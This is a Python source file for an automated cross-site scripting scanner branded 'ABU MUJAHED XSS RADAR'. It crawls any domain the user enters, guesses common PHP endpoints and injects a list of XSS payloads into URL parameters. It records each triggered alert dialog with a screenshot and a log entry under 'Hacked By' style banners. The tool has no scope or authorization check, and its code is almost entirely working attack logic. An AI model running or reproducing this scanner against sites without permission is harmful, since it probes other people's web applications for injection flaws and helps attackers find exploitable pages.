import asyncio
import os
from playwright.async_api import async_playwright
from urllib.parse import urljoin, urlparse

# -------------------------------------------------------------------
# TOOL NAME: ABU MUJAHED XSS RADAR (DeepHunter Edition)
# DEVELOPER: ABU MUJAHED
# -------------------------------------------------------------------

class DeepHunter:
    def __init__(self, base_url):
        self.base_url = base_url
        self.domain = urlparse(base_url).netloc
        self.visited_urls = set()
        self.targets_found = set()
        self.current_payload = ""
        
        if not os.path.exists('abu_mujahed_evidence'): 
            os.makedirs('abu_mujahed_evidence')
        
        self.payloads = [
            '<script>alert("Hacked By Abu Mujahed")</script>',
            '"><img src=x onerror=alert("Abu Mujahed IDOR/XSS")>',
            '"><svg onload=alert("ABU MUJAHED WAS HERE")>',
            "');alert('Abu Mujahed Result');('",
            "javascript:alert('Target Hit by Abu Mujahed')"
        ]

    async def handle_dialog(self, dialog, url, page):
        try:
            print(f"\n\033[91m🔥 [CRITICAL HIT BY ABU MUJAHED] -> {url}\033[0m")
            print(f"\033[92m💣 Payload Used: {self.current_payload}\033[0m")
            
            timestamp = int(asyncio.get_event_loop().time())
            path = f"abu_mujahed_evidence/hit_{timestamp}.png"
            await page.screenshot(path=path)
            
            with open("ABU_MUJAHED_HITS.txt", "a", encoding="utf-8") as f:
                f.write(f"[*] TARGET: {url}\n[*] BY: Abu Mujahed\n[*] PAYLOAD: {self.current_payload}\n[*] SCREEN: {path}\n{'-'*40}\n")
            
            await dialog.dismiss()
        except: pass

    async def get_all_links(self, page, url):
        try:
            print(f"\033[94m[*] Abu Mujahed Scraper -> Crawling: {url}\033[0m")
            await page.goto(url, wait_until="networkidle", timeout=15000)
            
            links = await page.evaluate("""() => {
                let found = [];
                document.querySelectorAll('a').forEach(a => found.push(a.href));
                document.querySelectorAll('frame, iframe').forEach(f => {
                    try { found.push(f.src); } catch(e) {}
                });
                return found;
            }""")

            for href in links:
                if not href or "javascript:" in href: continue
                full_url = urljoin(url, href)
                
                if self.domain in urlparse(full_url).netloc:
                    if "?" in full_url or any(ext in full_url for ext in [".php", ".asp", ".jsp", ".aspx"]):
                        self.targets_found.add(full_url)
                    
                    base_path = full_url.split('?')[0]
                    if base_path not in self.visited_urls:
                        self.visited_urls.add(base_path)

            common_paths = ["search.php", "login.php", "contact.php", "query.php", "profile.php", "api/v1/search"]
            for cp in common_paths:
                self.targets_found.add(urljoin(url, cp))

        except Exception as e:
            print(f"[!] Error: {e}")

    async def inject_payloads(self, page, url):
        print(f"\r\033[93m[~] Scanning: {url[:60]}...\033[0m", end="")
        page.on("dialog", lambda d: asyncio.create_task(self.handle_dialog(d, url, page)))
        
        try:
            parsed = urlparse(url)
            base_target = url.split('?')[0]
            params = parsed.query.split('&') if parsed.query else []
            
            for p in self.payloads:
                self.current_payload = p
                if params and params[0] != '':
                    for i in range(len(params)):
                        p_part = params[i].split('=')
                        p_name = p_part[0]
                        attack_query = "&".join([f"{params[j]}" if j != i else f"{p_name}={p}" for j in range(len(params))])
                        try:
                            await page.goto(f"{base_target}?{attack_query}", timeout=5000)
                        except: pass
                else:
                    for common_p in ["q", "id", "search", "msg", "name", "cat"]:
                        try:
                            await page.goto(f"{base_target}?{common_p}={p}", timeout=4000)
                        except: pass
        except: pass

    async def run(self):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            page = await browser.new_page()
            
            print("\033[95m" + "="*50)
            print("      ABU MUJAHED XSS RADAR v2.0")
            print("="*50 + "\033[0m")
            
            print(f"[+] Starting Deep Crawl: {self.base_url}")
            await self.get_all_links(page, self.base_url)
            
            final_targets = [t for t in self.targets_found if t.startswith("http")]
            print(f"\033[95m[+] Found {len(final_targets)} potential attack vectors.\033[0m")
            
            for target in final_targets:
                await self.inject_payloads(page, target)
                
            await browser.close()
            print(f"\n\033[92m[+] Mission Accomplished. Results saved for Abu Mujahed.\033[0m")

if __name__ == "__main__":
    print("\033[91m" + """
    ╔═╗╔╗ ╦ ╦  ╔╦╗╦ ╦╦╔═╗╦ ╦╔═╗╔╦╗
    ╠═╣╠╩╗║ ║  ║║║║ ║║╠═╣╠═╣║╣  ║║
    ╩ ╩╚═╝╚═╝  ╩ ╩╚═╝╩╩ ╩╩ ╩╚═╝═╩╝
    """ + "\033[0m")
    target = input("\033[96m[?] Target Domain/URL: \033[0m").strip()
    if target:
        hunter = DeepHunter(target if target.startswith("http") else "https://"+target)
        asyncio.run(hunter.run())
